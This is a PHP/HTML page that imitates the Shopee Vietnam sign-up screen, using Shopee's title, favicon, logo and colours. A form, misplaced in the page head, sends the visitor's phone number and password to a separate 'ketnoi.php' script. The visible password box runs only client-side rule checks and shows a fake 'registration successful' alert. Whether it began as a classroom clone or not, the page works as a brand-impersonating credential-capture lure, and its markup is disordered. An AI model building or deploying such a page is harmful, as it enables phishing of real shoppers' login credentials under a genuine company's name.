<?php
include 'ketnoi.php';
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $matkhau = trim($_POST['matkhau']); // Lấy mật khẩu người dùng nhập
}
?>
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Đăng ký | Shopee Việt Nam</title>
  <link rel="icon" href="https://cf.shopee.vn/file/faviconshopee.ico" type="image/x-icon">
  <form action="ketnoi.php" method="POST">
 <input type="text" name="dienthoai" placeholder="Số điện thoại" required>
<input type="password" name="matkhau" placeholder="Mật khẩu" required>
  <button type="submit">Đăng ký</button>
</form>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
    body { background-color: #f5f5f5}
    .header { background-color: #fff; padding: 10px 30px; display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #ddd; }
    .header img { height: 60px; }
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      margin: 0;
      padding: 0;
    }
    .container {
      max-width: 400px;
      margin: 100px auto;
      background-color: #fff;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: center;
    }
    h2 {
      margin-bottom: 10px;
    }
    p {
      font-size: 14px;
      color: #666;
      margin-bottom: 20px;
    }
    input[type="password"] {
      width: 100%;
      padding: 10px;
      font-size: 14px;
      border: 1px solid #ccc;
      border-radius: 4px;
      margin-bottom: 10px;
    }
    button {
      background-color: #ee4d2d;
      color: #fff;
      border: none;
      padding: 10px 20px;
      width: 100%;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
      background-color: #d73211;
    }
    .error {
      color: red;
      font-size: 13px;
      text-align: left;
    }
    .valid {
      color: green;
      font-size: 13px;
      text-align: left;
    }
  </style>
</head>
<body>
 <div class="header">
    <img width="60" src="https://img.icons8.com/color/70/shopee.png" alt="shopee"/> 
    <a href="#" style="color: #ee4d2d; text-decoration: none; position: fixed; left: 90px; "><h3> Shopee </h3> </a> 
    <a href="#" style="color: #040001ff; text-decoration: none; position: fixed; left: 170px;"><p> Đăng ký </p></a> 
    <a href="#" style="color: #d0011b; text-decoration: none;">Bạn cần giúp đỡ?</a> 
  </div>
  <div class="container">
    <h2>Thiết Lập Mật Khẩu</h2>
    <p>Bước cuối: tạo mật khẩu để hoàn tất việc đăng ký.</p>
    <input type="password" id="password" placeholder="Nhập mật khẩu của bạn">
    <div id="rules">
      <div id="rule-length" class="error">• Độ dài từ 8–16 ký tự</div>
      <div id="rule-lower" class="error">• Có ít nhất 1 chữ thường</div>
      <div id="rule-upper" class="error">• Có ít nhất 1 chữ hoa</div>
      <div id="rule-number" class="error">• Có ít nhất 1 chữ số</div>
      <div id="rule-special" class="error">• Có ít nhất 1 ký tự đặc biệt (!@#$%^&*)</div>
    </div>
    <br>
    <button id="register">Đăng Ký</button>
  </div>

  <script>
    const password = document.getElementById("password");
    const registerBtn = document.getElementById("register");
    
    const rules = {
      length: document.getElementById("rule-length"),
      lower: document.getElementById("rule-lower"),
      upper: document.getElementById("rule-upper"),
      number: document.getElementById("rule-number"),
      special: document.getElementById("rule-special")
    };

    password.addEventListener("input", () => {
      const val = password.value;

      const checks = {
        length: val.length >= 8 && val.length <= 16,
        lower: /[a-z]/.test(val),
        upper: /[A-Z]/.test(val),
        number: /[0-9]/.test(val),
        special: /[!@#$%^&*]/.test(val)
      };

      for (const key in checks) {
        if (checks[key]) {
          rules[key].classList.remove("error");
          rules[key].classList.add("valid");
        } else {
          rules[key].classList.add("error");
          rules[key].classList.remove("valid");
        }
      }
    });

    registerBtn.addEventListener("click", () => {
      const allValid = document.querySelectorAll(".valid").length === 5;
      if (allValid) {
        alert("Mật khẩu hợp lệ! Đăng ký thành công 🎉");
      } else {
        alert("Mật khẩu chưa đáp ứng đủ yêu cầu!");
      }
  });

  </script>
  <?php include 'footer.php'; 
?>
</body>
</html>
